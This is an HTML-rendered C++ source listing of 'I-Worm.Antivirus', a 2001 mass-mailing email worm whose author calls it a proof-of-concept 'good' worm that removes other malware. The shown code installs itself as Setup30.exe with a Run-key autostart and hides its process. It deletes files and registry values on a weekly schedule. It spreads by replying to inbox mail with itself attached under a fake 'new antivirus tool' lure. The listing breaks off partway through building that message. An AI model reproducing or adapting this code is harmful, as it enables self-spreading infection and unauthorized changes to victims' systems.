<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Atirus - Antivirus.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
I-Worm.Antivirus - The world's first 100% Antivirus worm
Copyright (c) 2001 by aLL3gRo - Malaysia, 16 August 2001
Compiled on Borland C++ v5.02
OS Supported: Win9x/NT/2K

Author's Notes:

This is a "proof of concept" worm which demonstrates that not all viruses are bad.
People always think that viruses and worms are bad and cause annoyance or damage.
Now, this little creature here will illustrate to you the good purposes of a worm.
This worm doesn't do damage. It's only purpose is to detect the presence of some known
worms/trojans and remove them from the system i.e. this is an example of a "good"
worm. I'm not sure if it works fine and stable coz I didn't do much testing.
The worm uses MAPI to spread itself. The MAPI routine is almost similar to the one
in I-Worm.Plage. This is because I've extracted the MAPI routine and modified it to
fit into this little creature.
When the worm is executed, it proceeds to install itself into the system as Setup30.exe
and modifies system registry to load it on every Windows startup.
The worm checks system date and takes actions based on the day of the week as below:

Sunday  - Scans memory for the presence of I-Worm.Badtrans.
          If detected, unload them from memory and remove Badtrans from the system.
Monday  - General routine: Restores HKEY_CLASSES_ROOT\exefile\shell\open\command
          to its original value "%1" %*. This would render some worms/trojans
          useless such as Pretty Park, Sircam, Subseven, Navidad etc..
          Also, worm erases whatever value in the Run and Load key in Win.ini
Tuesday - Search for I-Worm.PrettyPark and tries to disinfect it from the system
Wednesday - Search for mirc directory and deletes any script.ini file. This should
            eliminate most mirc worms.
Thursday -  Search for Sircam worm and tries to remove it.
Friday - General routine: Erases whatever value after the string Shell=Explorer.exe in
         System.ini.
Saturday - Deletes all vbs files in Windows and Windows System directory. This should
           eliminate most vbs worms.

When spreading via MAPI, the worm logons to default MAPI account, scans user inbox
and replies to each e-mail with the worm attached. I've limit the worm to only send
10 e-mails coz I don't wanna cause network congestion and clog down mail servers as
in creating a denial of service. 
I had to compress the main executable using UPX v1.20 coz Borland C++ includes many
runtime codes in its compiled executable.

Special thanks to Bumblebee/29A for the MAPI routine from I-Worm.Plage

*/</span><span class="sc0">

</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;mapi.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;stdio.h&gt;
</span><span class="sc0">

</span><span class="sc2">//All global variables
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">nam</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">  </span><span class="sc2">//the worm's original filename
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sysdir</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">windir</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">sysdr</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">windr</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">   </span><span class="sc2">//to get windows and system directory
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">chk</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">RunKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">wfd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">syst</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">OSVERSIONINFO</span><span class="sc0"> </span><span class="sc11">osvi</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">Mhwnd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mess</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">messId</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">fname</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">faddr</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">done</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">siz</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">done</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">=</span><span class="sc11">REG_SZ</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">PROCESSENTRY32</span><span class="sc0"> </span><span class="sc11">uProcess</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">lSnapshot</span><span class="sc10">,</span><span class="sc11">myproc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">rProcessFound</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">General1</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">General2</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">vbsdel</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">mirc</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Badtrans</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">PPark</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Sircam</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">RegisterServiceProcess</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLogoff</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MLogon</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MFindNext</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MReadMail</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">MFreeBuffer</span><span class="sc10">)(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc2">//Main Win32 entry point
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrev</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">county</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">k32</span><span class="sc10">=</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">RegisterServiceProcess</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">k32</span><span class="sc10">,</span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegisterServiceProcess</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc11">RegisterServiceProcess</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">sysdr</span><span class="sc10">,</span><span class="sc11">sysdir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">windr</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc6">"\\Setup30.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Kernel Setup"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">syst</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc10">==</span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wMonth</span><span class="sc10">==</span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"System protected by I-Worm.Antivirus\nCopyright (c) 2001 by aLL3gRo"</span><span class="sc10">,</span><span class="sc6">"Antivirus"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONINFORMATION</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">syst</span><span class="sc10">.</span><span class="sc11">wDayOfWeek</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">Badtrans</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">General1</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">PPark</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">mirc</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">Sircam</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">General2</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">vbsdel</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">,</span><span class="sc6">"Install"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc11">done</span><span class="sc10">,&amp;</span><span class="sc11">siz</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">RunKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">done</span><span class="sc10">,</span><span class="sc6">"1"</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">Mhwnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MLogon</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MLogoff</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MFindNext</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MReadMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MSendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">MFreeBuffer</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">Mhwnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFreeBuffer"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">MLogon</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_NEW_SESSION</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">session</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MReadMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_ENVELOPE_ONLY</span><span class="sc10">|</span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">mess</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">county</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">faddr</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc6">"New antivirus tool"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc6">"Hey, checkout this new antivirus tool which checks your system for viruses"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszMessageType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszDateReceived</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszConversationID</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc11">MAPI_SENT</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">fname</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">faddr</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
